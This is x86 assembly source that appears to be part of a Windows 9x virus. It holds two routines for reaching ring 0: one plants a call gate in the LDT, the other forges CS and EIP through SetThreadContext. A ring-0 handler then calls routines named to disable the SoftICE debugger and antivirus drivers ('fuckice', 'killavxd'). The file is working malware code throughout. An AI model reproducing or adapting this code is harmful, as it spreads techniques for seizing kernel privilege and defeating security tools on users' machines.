
; method #1: entering ring0 (seh, ldt, callgate)

callring0:              pusha

                        call    is_winNT            ; if only win9X
                        jz      __exit              ; winNT

                        seh_init

                        debugmsg r0init

                        downgrade __stdfind

                        cmp     esi, 0C0000A04h     ; tested
                        jne     __stdfind

                        call    find_ldt_prepare
                        jc      __ldt_notfound
                        call    find_ldt_scanmemory
                        jnc     __ldt_found
__ldt_notfound:

__stdfind:              call    find_ldt_via_gdt

__ldt_found:
                        fild    qword ptr [ebx]

                        pusho   r0proc
                        pop     eax
                        cld
                        mov     edi, ebx
                        stosd
                        stosd
                        mov     dword ptr [ebx+2], 0EC000028h

                        db      9Ah             ; вызов callgate-а
                        dd      0
                        dw      100b+11b        ; sel.#0, LDT, ring-3

                        fistp   qword ptr [ebx] ; восстановить дескриптор

                        debugmsg r0done

                        seh_done

__exit:
                        popa
                        ret

r0proc:                 call    r0_call_handler
                        retf

r0_call_handler:        pusha
                        push    ds es

                        push    ss ss
                        pop     ds es

                        call    ring0handler

                        pop     es ds
                        popa
                        ret

; output: ESI=curr. version
is_winNT:               call    xxGetVersion
                        xchg    esi, eax
                        test    esi, 80000000h
                        ret

; method #2: entering ring-0 (SetThreadContext)

callring0_2:            pusha

                        call    is_winNT            ; if only win9X
                        jz      __exit              ; winNT

                        seh_init

                        debugmsg r02init

                        mov     save_esp, esp
                        sub     esp, 1024+0C8h
                        push    -1

                        call    xxGetCurrentThread
                        xchg    ebx, eax

                        push    esp
                        push    ebx
                        call    xxGetThreadContext
                        or      eax, eax
                        jz      __error

                        push    28h
                        pop     eax
                        xchg    eax, [esp+0BCh]
                        mov     save_cs, eax

                        pusho   r0proc_2
                        pop     eax
                        xchg    eax, [esp+0B8h]
                        mov     save_eip, eax

                        push    esp
                        push    ebx
                        call    xxSetThreadContext

__error:                add     esp, 1024+0CCh

                        debugmsg r02done

                        seh_done

__exit:
                        popa
                        ret

r0proc_2:
                        xchg    esp, ss:save_esp

                        pushf
                        call    r0_call_handler
                        popf

                        mov     esp, ss:save_esp

                        pushf
                        push    ss:save_cs
                        push    ss:save_eip
                        iret

; ring0 code

ring0handler:           pusha

                        rnd     107
                        jz      __skip1

                        call    fuckice
__skip1:
                        rnd     101
                        jz      __skip2

                        call    killavxd
__skip2:

                        popa
                        ret
